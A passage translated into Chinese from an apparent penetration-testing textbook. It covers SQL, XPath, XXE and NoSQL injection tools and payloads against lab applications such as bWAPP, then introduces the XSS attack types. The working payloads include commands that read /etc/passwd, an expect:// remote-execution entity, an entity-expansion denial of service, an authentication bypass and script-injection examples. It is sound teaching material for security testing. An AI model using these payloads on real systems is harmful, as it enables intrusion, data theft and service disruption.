即使这里提供的工具不仅可以用于利用还可以用于检测漏洞，也不建议以这种方式使用它们，因为它们的模糊机制会产生大量的流量；它们不能轻易监视，你将对它们向服务器发出的请求种类有限的控制。这增加了对数据的损害风险，并使诊断事件变得更加困难，即使所有日志都被保留。

# sqlninja

**sqlninja**工具可以帮助你利用 Microsoft SQL 服务器作为后端数据库的应用程序中的 SQL 注入漏洞。使用 sqlninja 工具的最终目标是通过 SQL 注入漏洞控制数据库服务器。sqlninja 工具用 Perl 编写，可以在 Kali 中找到，导航至 Applications | Database Assessments。sqlninja 工具不能用于检测注入漏洞的存在，而是利用漏洞来获得对数据库服务器的 shell 访问。以下是 sqlninja 的一些重要功能：

+   用于对远程 SQL 服务器进行指纹识别，以确定版本、用户权限、数据库身份验证模式和`xp_cmdshell`的可用性

+   用于通过 SQLi 向目标上传可执行文件

+   用于与 Metasploit 集成

+   它使用混淆代码的 WAF 和 IPS 规避技术

+   使用 DNS 和 ICMP 协议进行 Shell 隧道

+   对旧版 MS SQL 的`sa`密码进行暴力破解

与 sqlmap 类似，sqlninja 工具可以与 Metasploit 集成，当工具利用注入漏洞并创建本地 shell 时，可以使用它来通过`meterpreter`会话连接到目标服务器。sqlninja 需要保存的所有信息都要保存在一个配置文件中。在 Kali Linux 中，示例配置文件保存在`/usr/share/doc/sqlninja/sqlninja.conf.example.gz`。你需要使用`gunzip`命令来提取它。你可以使用 Leafpad 编辑文件，并通过 Burp 等代理导出 HTTP 请求保存在其中。你还需要指定目标将连接到的本地 IP 地址。该工具附带了一份详细的逐步 HTML 指南，可以在与配置文件相同的位置找到，名为`sqlninja-how.html`。

配置文件看起来与下面的截图类似。`--httprequest_start--`和`--httprequest_end--`是标记，它们必须在 HTTP 请求的开始和结束处定义：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00146.jpeg)

`sqlninja`工具包含几个模块，如下图所示。每个模块都是为了使用不同的协议和技术访问服务器而创建的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00147.jpeg)

要开始利用，输入以下内容：

```

sqlninja -f <path to config file > -m m

```

sqlninja 工具现在将开始注入 SQL 查询以进行利用，当完成时，它将返回一个`meterpreter`会话。利用这一点，你可以完全控制目标。作为网络上最重要的关键服务器之一，数据库系统总是对恶意攻击者最具吸引力的目标。像 sqlninja 这样的工具可以帮助你在对手攻击之前了解 SQL 注入漏洞的严重性。作为 IT 安全专业人员，你最不想看到的就是攻击者获得对数据库服务器的 shell 访问。

# BBQSQL

Kali Linux 包含了一个专门用于利用盲 SQL 注入漏洞的工具。**BBQSQL** 是一个用 Python 编写的工具。它是一个菜单驱动的工具，会问几个问题，然后根据你的回答构建注入攻击。它是能够自动化测试盲 SQL 注入漏洞的较快的工具之一，而且具有很高的准确性。

BBQSQL 工具可以配置为使用二进制或频率搜索技术。它还可以根据应用程序的 HTTP 响应中的特定值来定制，以确定 SQL 注入是否成功。

如下截图所示，该工具提供了一个漂亮的菜单驱动向导。URL 和参数在第一个菜单中定义，输出文件，在第二个菜单中定义所使用的技术和响应解释规则：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00148.jpeg)

# sqlmap

**sqlmap** 工具可能是目前最完整的 SQL 注入工具。它自动化了发现 SQL 注入漏洞、准确猜测数据库类型和利用注入漏洞控制整个数据库服务器的过程。一旦利用注入，它还可以用作远程 shell，或者触发 Metasploit 载荷（如 Meterpreter）以获得更高级的访问权限。

sqlmap 的一些特性包括：

+   它为所有主要数据库系统提供支持。

+   它对基于错误和盲注的 SQL 注入都有效。

+   它可以枚举表和列名，还可以提取用户和密码哈希。

+   它支持通过利用注入漏洞下载和上传文件。

+   它可以使用不同的编码和篡改技术来绕过防御机制，如过滤、WAF 和 IPS。

+   它可以在数据库服务器上运行 shell 命令。

+   它可以与 Metasploit 集成。

在 Kali Linux 中，可以通过导航到应用程序|数据库评估找到 sqlmap。 要使用该工具，首先需要找到要测试 SQL 注入的输入参数。 如果变量是通过`GET`方法传递的，您可以向 sqlmap 工具提供 URL，它将自动化测试。 您还可以显式告诉 sqlmap 仅使用`-p`选项测试特定参数。 在下面的示例中，我们正在测试`username`变量是否存在注入漏洞。 如果发现存在漏洞，`--schema`选项将列出信息模式数据库的内容。 这个数据库包含所有数据库及其表信息：

```

sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -p username --schema

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00149.jpeg)

如果要注入的参数是使用`POST`方法传递的，可以将 HTTP 文件作为输入提供给`sqlmap`，其中包含标头和参数。 可以使用诸如 Burp 之类的代理生成 HTTP 文件，方法是在捕获流量时在 Raw 选项卡下复制显示的数据。

该文件将类似于以下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00150.jpeg)

然后可以将 HTTP 文件作为输入提供给`sqlmap`。 `--threads`选项用于选择应用程序的并发 HTTP 请求数。 `--current-db`选项将提取应用程序使用的数据库名称，而`--current-user`提取连接到数据库的用户的名称：

```

sqlmap -r bodgeit_login.txt -p username --current-db --current-user --threads 5

```

该命令产生以下输出。数据库名称为`PUBLIC`，用户名称为`SA`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00151.jpeg)

确定数据库名称后，可以使用`--tables`和`--columns`选项提取有关表和列的信息。 此外，`--data`选项可用于定义`POST`参数，而不是使用包含请求的文件。 请注意使用`"`（引号）； 它们用于使 Linux shell 将整套参数解释为单个字符串，并转义`&`（和号）字符，因为它是 Unix 系统命令行中的保留运算符：

```

sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23" -D public --tables

```

您将看到以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00152.jpeg)

要从某些表中提取所有数据，我们使用`--dump`选项加上`-D`指定数据库和`-T`指定表：

```

sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23" -D public -T users -dump

```

让我们看一个输出示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00153.jpeg)

攻击者的目标是利用 SQL 注入漏洞在服务器上进一步立足。 使用 sqlmap，您可以利用这个漏洞在数据库服务器上读写文件，这会调用目标上的`load_file()`和`out_file()`函数来实现它。 在下面的示例中，我们正在读取服务器上`/etc/passwd`文件的内容：

```

sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -p username --file-read /etc/passwd

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00154.jpeg)

`sqlmap`工具提供了一些额外的选项，如下表所示：

| **选项** | **描述** |
| --- | --- |
| `-f` | 这将对数据库执行广泛的指纹识别 |
| `-b` | 这会检索 DBMS 横幅 |
| `--sql-shell` | 成功利用后访问 SQL shell 提示符 |
| `--schema` | 这枚举数据库模式 |
| `--comments` | 在数据库中搜索评论 |
| `--reg-read` | 这读取 Windows 注册表键值 |
| `--identify-waf` | 这识别 WAF/IPS 保护 |
| `--level N` | 这将扫描级别（注入变体的数量和复杂性）设置为`N`（1-5） |
| `--risk N` | 这设置了请求的风险（1-3）；等级 2 包括基于时间的重型请求；等级 3 包括基于 OR 的请求 |
| `--os-shell` | 这尝试返回系统 shell |

您可以在 sqlmap 的 GitHub 项目页面[`github.com/sqlmapproject/sqlmap/wiki/Usage`](https://github.com/sqlmapproject/sqlmap/wiki/Usage)中找到您可以与 sqlmap 一起使用的所有选项的详尽列表。

# SQL 注入漏洞的攻击潜力

以下是用于操纵 SQL 注入漏洞的技术：

+   通过修改 SQL 查询，攻击者可以从数据库中检索普通用户无权访问的额外数据

+   通过从数据库中删除关键数据运行 DoS 攻击

+   绕过认证并执行特权升级攻击

+   使用批量查询，可以在单个请求中执行多个 SQL 操作

+   可以使用高级 SQL 命令来枚举数据库的模式，然后也可以修改结构

+   使用`load_file()`函数在数据库服务器上读取和写入文件以及`into outfile()`函数写入文件

+   诸如 Microsoft SQL 之类的数据库允许通过 SQL 语句运行 OS 命令使用`xp_cmdshell`；对 SQL 注入漏洞的应用程序可以允许攻击者完全控制数据库服务器，并通过它也攻击网络上的其他设备

# XML 注入

本节将涵盖在 Web 应用程序中使用 XML 的两种不同观点：

+   当应用程序在 XML 文件或 XML 数据库中执行搜索时

+   当用户提交以 XML 格式化的信息以供应用程序解析时

# XPath 注入

**XPath**是用于从 XML 文档中选择节点的查询语言。以下是基本的 XML 结构：

```

<rootNode>

<childNode>

<element/>

</childNode>

</rootNode>

```

一个 XPath 对**element**的搜索可以表示如下：

```

/rootNode/childNode/element

```

可以制作更复杂的表达式，例如，对登录页面的 XPath 查询可能如下所示：

```

//Employee[UserName/text()='myuser' And Password/text()='mypassword']

```

与 SQL 一样，如果用户输入被直接连接到查询字符串中，此类输入可能被解释为代码而不是数据参数。

例如，让我们看一下 bWapp 的 XML/XPath 注入（搜索）练习。它显示了一个下拉框，您可以在其中选择一种类型，并搜索匹配这种类型的电影：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00155.jpeg)

在这里，`genre`是应用程序在服务器端进行的某些搜索的输入参数。要测试它，您需要创建一个搜索，同时让浏览器首先识别将`genre`参数发送到服务器的请求（`/bWAPP/xmli_2.php?genre=action&action=search`），然后将其发送到 Repeater。您将使用 Burp Suite 或 ZAP 等代理执行此操作。一旦进入 Repeater，将一个单引号添加到流派中。然后，点击 Go 并分析响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00156.jpeg)

通过添加一个单引号，我们导致应用程序响应中出现了语法错误。这清楚地表明正在使用 XPath。现在您需要知道查询是如何构建的。首先，让我们看看它是否寻找整个文本或其中的一部分。删除流派的最后几个字母，然后点击 Go：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00157.jpeg)

您可以看到，即使只使用流派的一部分，您仍然会获得与使用完整单词相同的结果。这意味着查询正在使用`contains()`函数。您可以查看 [`github.com/redmondmj/bWAPP`](https://github.com/redmondmj/bWAPP) 中的源代码，因为它是一个开源应用程序。但是，让我们采取黑盒方法；因此，可能是以下的内容：

```

.../node[contains(genre, '$genre_input')]/node...

```

尽管您可能不知道完整的查询，但可以非常自信地认为`[contains(genre, '$genre_input')]`或类似的内容已经存在。

现在尝试更加复杂的注入，试图检索您注入的 XML 文件中的所有记录：

```

')]/*|//*contains('1','1

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00158.jpeg)

您可以看到响应包含的信息比原始查询要多得多，应用程序不会将其中一些信息作为正常搜索的一部分显示出来。

# 使用 XCat 进行 XPath 注入

**XCat** 是一个用 Python 3 编写的工具，可以帮助您利用 XPath 注入漏洞检索信息。它在 Kali Linux 中默认不包含，但可以轻松添加。您需要在 Kali Linux 中安装 Python 3 和 pip，然后只需在终端中运行以下命令：

```
apt-get install python3-pippip3 install xcat
```

安装 XCat 后，您需要在 bWAPP 中进行身份验证，以获取易受攻击的 URL 和 cookie，以便您可以使用以下结构的命令：

```
xcat -m <http_method> -c "<cookie value>" <URL_without_parameters> <injecable_parameter> <parameter1=value> <parameter2=value> -t "<text_in_true_results>"
```

在这种情况下，命令将如下所示：

```
xcat -m GET -c "PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F9867;security_level=0" http://10.7.7.5/bWAPP/xmli_2.php genre genre=horror action=search -t ">1<"
```

注意，我们使用`">1<"`作为真实字符串。这是因为结果表中的数字仅在找到至少一个结果时才会出现。对 bWAPP 运行该命令将导致类似以下的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00159.jpeg)

# XML 外部实体注入

在 XML 中，一个**实体**是一个可以是内部或外部的存储单元。内部实体是指在其声明中定义了其值的实体，而外部实体则从外部资源（如文件）中获取值。当应用程序接收来自用户的一些 XML 格式的输入并处理其中声明的外部实体时，它容易受到**XML 外部实体**（**XXE**）注入的影响。

我们将再次使用 bWAPP，在 /A7 - Missing Functional Level Access Control/ 中使用 XEE 练习来进行实践。在那里，你将只看到一个带有按钮的文本，当你点击时似乎什么也没有发生。然而，让我们检查代理的记录请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00160.jpeg)

因此，在这里你正在发送一个包含你的用户名和一些秘密的 XML 结构。你发送请求给 Repeater，以进一步分析和测试。首先，尝试创建一个内部实体，看看服务器是否处理它。要做到这一点，请提交以下 XML：

```

<!DOCTYPE test [ <!ENTITY internal-entity "boss" >]>

<reset><login>&internal-entity;</login><secret>Any bugs?</secret></reset>

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00161.jpeg)

在这里我们创建了一个名为`internal-entity`的实体，其值为`"boss"`，然后我们使用该实体来替换登录值，这反映在响应中。这意味着你通过该实体加载的任何内容都将被服务器处理和反映。

尝试加载一个文件，如下所示：

```

<!DOCTYPE test [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00162.jpeg)

使用`SYSTEM`，你正在定义一个外部实体。这加载一个文件(`/etc/passwd`)，服务器将在其响应中显示结果。

如果解析器未正确配置，并且加载了`expect` PHP 模块，你还可以通过 XEEs 获得远程执行权限：

```

<!DOCTYPE test [  <!ENTITY xxe SYSTEM "expect://uname -a" >]>

```

# 实体扩展攻击

即使解析器不允许外部实体，允许内部实体仍然可能被恶意用户利用并导致服务器中断。由于所有 XML 解析器都会使用其定义的值来替换实体，因此可以创建一组递归实体，以便服务器可以处理大量信息，直到无法响应。

这被称为**实体扩展攻击**。以下结构是一个简单的概念证明：

```

<!DOCTYPE test [

<!ENTITY entity0 "Level0-">

<!ENTITY entity1 "Level1-&entity0;">

<!ENTITY entity2 "Level2-&entity1;&entity1;">

<!ENTITY entity3 "Level3-&entity2;&entity2;&entity2;">

<!ENTITY entity4 "Level4-&entity3;&entity3;&entity3;&entity3;">

<!ENTITY entity5 "Level5-&entity4;&entity4;&entity4;&entity4;&entity4;">

]>

<reset><login>&entity0;</login><secret>Any bugs?</secret></reset>

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00163.jpeg)

在这里，你可以看到当加载`entity5`时会发生什么。所有其他实体也将被加载。这些信息在服务器内存中存储，因此如果你发送足够大的有效负载或足够深的递归，可能会导致服务器内存耗尽，无法响应用户的请求。

现在让我们看看在加载`entity5`时响应的大小会如何变化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00164.jpeg)

重要的是要记住，在对真实应用程序进行渗透测试时，必须极其谨慎，并且仅在可以证明漏洞存在而不会对服务造成中断的情况下进行测试，除非客户另有要求。在这种情况下，应采取特殊环境和特殊记录和监控措施。对于实体扩展攻击，展示六到七级的递归可以足以作为概念的证明。还应考虑响应时间。

# NoSQL 注入

近年来，**大数据**或者说各种版本和不同目的的大量信息的存储、处理和分析越来越受到各种规模公司的推广和实施。这种信息通常是非结构化的，或者来自不一定兼容的来源。因此，它需要存储在一种特殊类型的数据库中，即所谓的**Not only SQL** (**NoSQL**) 数据库，如 MongoDB、CouchDB、Cassandra 和 HBase。

上述数据库管理器不使用 SQL（或者不仅使用 SQL）并不意味着它们没有注入风险。请记住，SQL 注入漏洞是由于发送查询的应用程序缺乏验证造成的，而不是由 DBMS 处理造成的。对 NoSQL 数据库的查询进行代码注入或参数更改是可能的，也并不罕见。

# 对 NoSQL 注入进行测试

NoSQL 查询通常以 JSON 格式完成。例如，MongoDB 中的查询可能如下所示：

```

User.find({ username: req.body.username, password: req.body.password }, ...

```

要在使用 MongoDB 数据库的应用程序中注入代码，您需要利用 JSON 语法，使用字符如 `' " ; { }` 并形成有效的 JSON 结构。

# 利用 NoSQL 注入

要测试实际的利用方式，您可以使用由 Snyk 制作的易受攻击应用程序（[`github.com/snyk/goof`](https://github.com/snyk/goof)）。要运行此应用程序，您需要在目标服务器上安装并正确运行 Node.js 和 MongoDB。

您应该尝试绕过管理员部分的密码检查的注入攻击。设置代理后，浏览到您的易受攻击应用程序的管理员部分。在这个例子中，它将是`http://10.0.2.2:3001/admin`。如果您提交用户`admin`和任何密码，您会发现没有访问权限。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00165.jpeg)

如果您将该请求发送给 Repeater，您会发现它正在发送两个参数：`username`和`password`。您应该更改请求格式为 JSON。要做到这一点，您需要更改`Content-Type`头的值和参数的格式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00166.jpeg)

如果您提交了该请求，服务器似乎会接受它，因为不会生成任何错误。因此，为了明确起见，让我们使用实际的`admin`密码以 JSON 格式确保它确实被接受：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00167.jpeg)

现在您知道它是如何工作的，请尝试注入条件而不是密码值，以便验证始终为真。查询将会说：“如果用户名是`admin`且密码大于空字符串”：

```

{"username":"admin","password":{"$gt":""}}

```

`$gt`是 MongoDB 的一个特殊查询运算符，表示大于（`>`）的二进制操作。更多的运算符和注入字符串可以在[`github.com/cr0hn/nosqlinjection_wordlists`](https://github.com/cr0hn/nosqlinjection_wordlists)找到。

NoSQLMap（[`github.com/codingo/NoSQLMap.git`](https://github.com/codingo/NoSQLMap.git)）是一个开源工具，未包含在 Kali Linux 中，但易于安装。它可以用于自动化 NoSQL 注入的检测和利用。

# 缓解和预防注入漏洞

防止注入漏洞的关键是*验证*。用户提供的输入永远不应被信任，应始终进行验证，并在包含以下无效或危险字符时予以拒绝或清理：

+   引号（`'` 和 `"`)

+   括号和方括号

+   保留特殊字符（`'!'`、`'%'`、`'&'` 和 `';'`）

+   注释组合（`'--'`、`'/*'`、`'*/'`、`'#'` 和 `'(:', ':)'`）

+   其他特定于语言和实现的字符

验证的推荐方法是**白名单**。这意味着对于每个输入字段或字段组，都有一个允许字符的列表，并将提交的字符串与该列表进行比较。提交的字符串中的所有字符必须在允许列表中才能通过验证。

对于防止 SQL 注入，应使用参数化或准备好的语句，而不是将输入连接到查询字符串。准备好的语句的实现因语言而异，但它们都遵循同样的原则；由客户端提供的输入不会连接到查询字符串，而是作为参数发送到一个适当构建查询的函数。以下是 PHP 的一个示例：



```

$stmt = $dbh->prepare("SELECT * FROM REGISTRY where name LIKE '%?%'");

$stmt->execute(array($_GET['name']));

```

这个主题的一些有用参考资料如下：

+   [`www.owasp.org/index.php/Data_Validation`](https://www.owasp.org/index.php/Data_Validation)

+   [`www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

+   [`www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

# 概要

在本章中，我们讨论了各种注入漏洞。注入漏洞是 Web 应用程序中的严重漏洞，攻击者可以通过利用它来完全控制服务器。我们还研究了通过不同类型的注入，恶意攻击者可以访问操作系统。然后可以用来攻击网络上的其他服务器。当攻击者利用 SQL 注入漏洞时，他们可以访问后端数据库中的敏感数据。这对组织来说可能是灾难性的。

在下一章中，我们将了解一种特定类型的注入漏洞，即跨站脚本（Cross-Site Scripting），它允许攻击者通过在请求参数中注入或诱使用户注入脚本代码来改变页面向用户呈现的方式。


# 第六章：发现和利用跨站脚本（XSS）漏洞

Web 浏览器是一个代码解释器，它接受 HTML 和脚本代码以以吸引人和有用的格式向用户呈现文档，包括文本、图像和视频剪辑。它允许用户与动态元素进行交互，包括搜索字段、超链接、表单、视频和音频控件等等。

应用程序有许多方法来管理与用户的这种动态交互。在当今的 Web 应用程序中，最常见的方式是使用客户端脚本代码。这意味着服务器向客户端发送将由 Web 浏览器执行的代码。

当用户输入用于确定脚本代码行为，并且此输入未经适当验证和清理以防止其包含代码而不是信息时，浏览器将执行注入的代码，您将拥有**跨站脚本**（**XSS**）漏洞。

XSS 是一种代码注入类型，当脚本代码被添加到用户的输入并被 Web 浏览器作为代码而不是数据处理时，就会发生 XSS 漏洞，然后执行它，改变用户看到页面和/或其功能的方式。

# 跨站脚本攻击概述

名称“跨站脚本”可能与其当前定义不直观相关。这是因为该术语最初指的是一种相关但不同的攻击。在 20 世纪 90 年代末和 21 世纪初，可以使用 JavaScript 代码从加载在相邻窗口或框架中的 Web 页面中读取数据。因此，恶意网站可以跨越两者之间的边界，并与与其域无关的完全不相关的 Web 页面上加载的内容进行交互。浏览器开发人员后来修复了这个问题，但攻击名称被继承，用于使 Web 页面加载和执行恶意脚本而不是从相邻框架中读取内容的技术。

简单来说，XSS 攻击允许攻击者在另一个用户的浏览器中执行恶意脚本代码。它可以是 JavaScript、VBScript 或任何其他脚本代码，尽管 JavaScript 是最常用的。恶意脚本通过易受 XSS 攻击的网站传递给客户端。在客户端上，Web 浏览器将脚本视为网站的合法部分并执行它们。当脚本在受害者的浏览器中运行时，它可以强制浏览器执行类似于用户可以执行的操作。脚本还可以使浏览器执行欺诈性交易、窃取 Cookie 或将浏览器重定向到另一个网站。

XSS 攻击通常涉及以下参与者：

+   执行攻击的攻击者

+   易受攻击的 Web 应用程序

+   使用 Web 浏览器的受害者

+   攻击者希望通过受害者重定向浏览器或攻击第三方网站

让我们看一个攻击者执行 XSS 攻击的例子：

1.  攻击者首先使用合法数据测试各个输入字段的 XSS 漏洞。将数据反映回浏览器的输入字段可能是 XSS 漏洞的候选项。以下截图显示了一个示例，其中网站使用`GET`方法传递输入并将其显示回浏览器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00168.jpeg)

1.  一旦攻击者找到一个参数来注入，该参数上没有进行足够或没有进行输入验证，他们将不得不设计一种方法将包含 JavaScript 的恶意 URL 传递给受害者。攻击者可以使用电子邮件作为传递机制，或者通过网络钓鱼攻击引诱受害者查看电子邮件。

1.  电子邮件将包含一个指向易受攻击的 Web 应用程序的 URL 以及注入的 JavaScript。当受害者点击它时，浏览器解析 URL 并将 JavaScript 发送到网站。以 JavaScript 形式的输入在浏览器中反映出来；考虑以下示例：

```
      <script>alert('Pwned!!')</script>. 
```

完整的 URL 是`http://example.org/hello.php?name=<script>alert('Pwned!!')</script>`。

1.  警报方法通常用于演示目的和测试应用程序是否存在漏洞。在本章后面，我们将探讨攻击者经常使用的其他 JavaScript 方法。

1.  如果 Web 应用程序存在漏洞，将在受害者的浏览器中弹出对话框，如下面的屏幕截图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00169.jpeg)

XSS 的主要目标是在受害者的浏览器中执行 JavaScript，但根据网站的设计和目的，有不同的实现方式。以下是 XSS 的三个主要类别：

+   持久性 XSS

+   反射型 XSS

+   基于 DOM 的 XSS

# 持久性 XSS

当注入的数据存储在 Web 服务器或数据库上，并且应用程序在不进行验证的情况下将其返回给应用程序的一个或所有用户时，XSS 漏洞被称为**持久性**或**存储型**。一个目标是感染网站的每个访问者的攻击者将使用持久性 XSS 攻击。这使得攻击者能够大规模地利用网站。

持久性 XSS 漏洞的典型目标如下：

+   基于 Web 的讨论论坛

+   社交网络网站

+   新闻网站

**持久性 XSS**被认为比其他 XSS 漏洞更严重，因为攻击者的恶意脚本会自动注入到受害者的浏览器中。它不需要钓鱼攻击来诱使用户点击链接。攻击者将恶意脚本上传到一个易受攻击的网站，然后作为受害者正常浏览活动的一部分传递给受害者的浏览器。由于 XSS 也可以用于从外部网站加载脚本，这在存储型 XSS 中尤其具有破坏力。注入后，以下代码将查询远程服务器以执行 JavaScript：

```
<script type="text/javascript"  src="img/malicious.js"></script> 
```

下图显示了一个易受持久性 XSS 攻击的 Web 应用程序示例。该应用程序是一个在线论坛，用户可以创建帐户并与其他人互动。应用程序将用户的个人资料与其他详细信息一起存储在数据库中。攻击者确定该应用程序未对评论部分中的数据进行过滤，并利用此机会向该字段添加恶意 JavaScript。此 JavaScript 被存储在 Web 应用程序的数据库中。在正常浏览时，当一个无辜的受害者查看这些评论时，JavaScript 会在受害者的浏览器中执行，然后获取 cookie 并将其传递给攻击者控制的远程服务器：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00170.jpeg)

最近，持久性 XSS 已经在互联网上的多个网站上被用来利用用户的网站作为加密货币挖矿的工人或组成浏览器僵尸网络。

# 反射型 XSS

**反射型 XSS**是一种非持久性的攻击形式。恶意脚本是受害者对 Web 应用程序的请求的一部分，然后由应用程序以响应的形式反射回来。这可能看起来很难利用，因为用户不会自愿向服务器发送恶意脚本，但有几种方法可以诱使用户对自己的浏览器发起反射型 XSS 攻击。

反射型 XSS 主要用于有针对性的攻击，黑客部署了包含恶意脚本和 URL 的钓鱼邮件。或者，攻击可能涉及在公共网站上发布一个链接，并引诱用户点击它。结合缩短 URL 的服务，缩短 URL 并隐藏在受害者心中会产生疑问的长而奇怪的脚本，可以用于执行反射型 XSS 攻击，成功率很高。

如下图所示，受害者被欺骗点击一个将脚本传递给应用程序的 URL，然后没有适当验证地反射回来：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00171.jpeg)

# 基于 DOM 的 XSS

第三种类型的 XSS 是本地 XSS，直接影响受害者的浏览器。这种攻击不依赖于向服务器发送恶意内容，而是使用浏览器的 API——**文档对象模型**（**DOM**）来操作和呈现网页。在持久型和反射型 XSS 中，脚本被服务器包含在响应中。受害者的浏览器接受它，并将其视为网页的合法部分，在页面加载时执行。在**基于 DOM 的 XSS**中，只有服务器提供的合法脚本会被执行。

越来越多的 HTML 页面是通过在客户端下载 JavaScript 并使用配置参数来调整用户所见内容生成的，而不是像应该显示的那样由服务器发送。每当页面的某个元素需要在不刷新整个页面的情况下更改时，都会使用 JavaScript 来完成。一个典型的例子是一个允许用户更改页面语言或颜色，或调整其中元素大小的网站。

基于 DOM 的 XSS 利用这个合法的客户端代码来执行脚本攻击。基于 DOM 的 XSS 最重要的部分是，合法的脚本使用用户提供的输入来向用户浏览器上显示的网页添加 HTML 内容。

让我们讨论一个基于 DOM 的 XSS 的例子：

1.  假设创建了一个网页，根据 URL 中传递的城市名称显示定制内容，URL 中的城市名称也会显示在用户浏览器上的 HTML 网页中，如下所示：

```
      http://www.cityguide.test/index.html?city=Mumbai
```

1.  当浏览器接收到上述 URL 时，它会发送一个请求到`http://www.cityguide.test`以接收网页。在用户的浏览器上，会下载并运行一个合法的 JavaScript，它会编辑 HTML 页面，在加载的页面顶部添加城市名称作为标题。城市名称是从 URL 中获取的（在这种情况下是`Mumbai`）。因此，城市名称是用户可以控制的参数。

1.  如前所述，基于 DOM 的 XSS 中的恶意脚本不会被发送到服务器。为了实现这一点，使用`#`符号来阻止发送到服务器的符号后面的任何内容。因此，服务器端代码无法访问它，尽管客户端代码可以访问它。

恶意 URL 可能看起来像以下内容：

```
      http://www.cityguide.test/index.html?#city=<script>function</script>
```

1.  当页面加载时，浏览器会调用使用 URL 中的城市名称生成 HTML 内容的合法脚本。在这种情况下，合法脚本遇到恶意脚本，并将脚本写入 HTML 正文而不是城市名称。当网页呈现时，脚本被执行，导致基于 DOM 的 XSS 攻击。

下图说明了基于 DOM 的 XSS：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00172.jpeg)

# 使用 POST 方法的 XSS 攻击

在前面的例子中，你已经看到了使用`GET`方法向受害者传递恶意链接或将载荷存储在服务器上的方法。虽然在现实生活中可能需要更复杂的设置来进行攻击，但使用`POST`请求进行 XSS 攻击也是可能的。

由于`POST`参数是发送到请求的正文中而不是 URL 中，使用这种方法进行 XSS 攻击需要攻击者说服受害者浏览到由攻击者控制的站点。这将是向易受攻击的服务器发送恶意请求的站点，并向用户响应，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/web-pentest-kali-3e/img/00173.jpeg)

其他 XSS 攻击向量

通过`POST`或`GET`方法发送的表单参数并不是唯一用于 XSS 攻击的参数。头部值，如`User-Agent`、`Cookie`、`Host`以及任何其他将信息反映给客户端的头部，甚至通过`OPTIONS`或`TRACE`方法也是易受 XSS 攻击的。作为渗透测试人员，您需要完全测试由服务器处理并反射回用户的请求的所有组件。

# 利用跨站脚本攻击

黑客在利用 XSS 漏洞时非常有创意，结合当前浏览器中 JavaScript 的功能，攻击可能性增加了。结合 JavaScript 的 XSS 可以用于以下类型的攻击：

+   账户劫持

+   修改内容

+   篡改网站

+   从受害者的机器上运行端口扫描

+   记录按键和监控用户活动

+   窃取浏览器信息

+   利用浏览器漏洞

触发 XSS 漏洞的方式有很多种，不仅仅是`<script></script>`标签。请参考 OWASP 的防御备忘单，链接如下：

[`www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet`](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

在接下来的几节中，我们将看一些实际的例子。

# 窃取 cookie

XSS 漏洞的一个直接影响是攻击者可以使用脚本代码窃取有效的会话 cookie，并使用它劫持用户的会话，如果 cookie 的参数没有配置好的话。

